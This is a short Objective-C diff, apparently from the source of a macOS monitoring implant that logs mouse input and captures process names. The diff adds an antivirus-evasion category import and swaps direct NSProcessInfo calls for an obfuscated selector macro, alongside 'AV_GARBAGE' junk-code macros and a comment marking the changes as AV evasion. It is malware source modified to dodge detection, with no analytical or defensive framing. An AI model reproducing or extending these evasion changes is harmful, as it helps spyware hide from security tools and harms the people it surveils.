@@ -15,6 +15,7 @@
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
+#import "NSProcessInfo+NSProcessInfo__AVEvasion_.h"
 #import "RCSMAVGarbage.h"
 
 static int contextHasBeenSwitched = 0;
@@ -146,7 +147,7 @@ static int height  = 30;
         
           contextHasBeenSwitched = 0;
 
-          NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
+          NSProcessInfo *processInfo  = [NSProcessInfo PROCESSINFO_SEL];
           
           // AV evasion: only on release build
           AV_GARBAGE_008
@@ -420,7 +421,7 @@ static int height  = 30;
   AV_GARBAGE_001
   
   NSMutableData *entryData = [[NSMutableData alloc] initWithLength: sizeof(mouseAdditionalStruct)];
-  NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
+  NSProcessInfo *processInfo  = [NSProcessInfo PROCESSINFO_SEL];
   NSString *_processName      = [[processInfo processName] copy];
   
   processName  = [[NSMutableData alloc] initWithData:
